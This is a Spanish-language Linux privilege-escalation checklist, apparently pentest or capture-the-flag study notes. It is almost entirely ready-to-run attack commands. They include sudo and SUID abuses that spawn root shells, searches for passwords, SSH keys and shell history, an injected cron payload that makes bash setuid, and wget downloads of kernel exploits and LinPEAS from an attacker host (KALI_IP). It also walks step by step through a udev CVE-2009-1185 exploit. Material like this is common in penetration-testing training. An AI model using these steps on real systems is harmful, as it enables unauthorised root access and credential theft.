# Escalada de Privilegios — Linux

## Descripción

Checklist completo para escalar privilegios en Linux una vez que tienes shell. Sigue el orden — los primeros vectores son los más fáciles y rápidos.

---

## Primero — Estabiliza la shell

Antes de nada, convierte la shell básica en una TTY interactiva:

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
# o Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
# o con script
script /dev/null -c bash
```

---

## Reconocimiento básico — Ejecuta siempre esto primero

```shell
whoami                                      # Usuario actual
id                                          # Usuario, grupo y grupos secundarios
uname -a                                    # Versión del kernel
cat /etc/os-release                         # Distribución y versión
cat /etc/passwd                             # Lista de usuarios del sistema
ps aux                                      # Procesos en ejecución
netstat -tlnp 2>/dev/null || ss -tlnp      # Servicios internos
env                                         # Variables de entorno (pueden tener credenciales)
```

---

## Vector 1 — Sudo sin contraseña  (el más fácil)

```shell
sudo -l
```

Si aparece `(ALL) NOPASSWD: /ruta/binario`, puedes ejecutarlo como root sin contraseña.

Consulta **GTFOBins** (`https://gtfobins.github.io`) para ver cómo abusar de ese binario.

Ejemplos comunes:

```shell
# find
sudo find . -exec /bin/bash \; -quit

# vim
sudo vim -c ':!/bin/bash'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# less
sudo less /etc/passwd
# Dentro de less: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

---

## Vector 2 — Binarios SUID inusuales

```shell
find / -perm -4000 -type f 2>/dev/null
```

Busca binarios que NO deberían tener SUID. Los normales son: `su`, `mount`, `umount`, `ping`, `passwd`, `sudo`.

Si encuentras algo inusual como `bash`, `vim`, `find`, `python`, `nmap`, `cp`:

```shell
# bash con SUID
bash -p

# find con SUID
find . -exec /bin/bash -p \; -quit

# python con SUID
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Consulta GTFOBins para cualquier binario que encuentres.

---

## Vector 3 — Credenciales en archivos

```shell
# Archivos de configuración con posibles contraseñas
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null

# Historial de comandos
cat ~/.bash_history
cat ~/.zsh_history

# Claves SSH privadas
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Buscar la palabra "password" en archivos
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
```

---

## Vector 4 — Tareas cron

```shell
cat /etc/crontab
ls -la /etc/cron*
crontab -l
# Ver procesos que se lanzan periódicamente
watch -n 1 "ps aux"
```

Si hay un script que se ejecuta como root y tú puedes escribir en él:

```shell
echo 'chmod +s /bin/bash' >> /ruta/al/script.sh
# Esperar a que se ejecute
bash -p
```

---

## Vector 5 — Servicios internos

```shell
netstat -tlnp 2>/dev/null || ss -tlnp
```

Busca puertos que solo escuchan en localhost (127.0.0.1) y no estaban expuestos en el nmap inicial. Pueden ser servicios vulnerables accesibles solo desde dentro.

Para acceder desde fuera puedes hacer **port forwarding** con SSH si tienes credenciales.

---

## Vector 6 — Kernel exploit

Si ningún vector anterior funciona, busca exploits del kernel:

```shell
uname -a    # Anotar versión exacta del kernel
```

```shell
# En Kali
searchsploit linux kernel VERSION
searchsploit udev VERSION
searchsploit "linux local privilege"
```

Recursos online:
- `https://github.com/lucyoa/kernel-exploits`
- `https://github.com/SecWiki/linux-kernel-exploits`

### Proceso para exploits en C

```shell
# En Kali — preparar el exploit
cp /usr/share/exploitdb/exploits/linux/local/EXPLOIT.c /tmp/
# Levantar servidor HTTP
cd /tmp && python3 -m http.server 8080

# En la víctima — descargar, compilar y ejecutar
wget http://KALI_IP:8080/EXPLOIT.c
gcc EXPLOIT.c -o exploit
./exploit
```

> **Importante:** Compila siempre en la máquina víctima. Los headers del kernel de Kali moderno son incompatibles con exploits para kernels antiguos.

---

## Vector 7 — udev CVE-2009-1185 (kernel 2.6.x Ubuntu)

Para kernels 2.6.x en Ubuntu 8.x/9.x:

```shell
# 1. Encontrar PID del socket NETLINK
cat /proc/net/netlink     # Busca Eth=15, Groups=00000001
ps aux | grep udev        # Confirma PID del proceso udevd
# Socket NETLINK = PID udevd - 1

# 2. Crear payload
echo '#!/bin/bash' > /tmp/run
echo 'chmod +s /bin/bash' >> /tmp/run
chmod +x /tmp/run

# 3. Descargar exploit (8572.c) y compilar
wget http://KALI_IP:8080/udev.c
gcc udev.c -o udev

# 4. Ejecutar
./udev PID_NETLINK

# 5. Escalar
bash -p
whoami  # root
```

---

## Herramientas automáticas de enumeración

Cuando no encuentras nada manualmente, usa estas herramientas que automatizan toda la enumeración:

```shell
# LinPEAS — la más completa
wget http://KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget http://KALI_IP:8080/linenum.sh
chmod +x linenum.sh
./linenum.sh
```

Descarga LinPEAS en Kali desde: `https://github.com/carlospolop/PEASS-ng`

---

## Checklist rápido

```
[ ] Estabilizar shell con python pty
[ ] whoami / id / uname -a
[ ] sudo -l → GTFOBins
[ ] find / -perm -4000 → GTFOBins
[ ] Credenciales en archivos de configuración
[ ] ~/.bash_history
[ ] /etc/crontab y scripts de cron
[ ] Servicios internos en localhost
[ ] Versión del kernel → searchsploit
[ ] LinPEAS si nada funciona
```
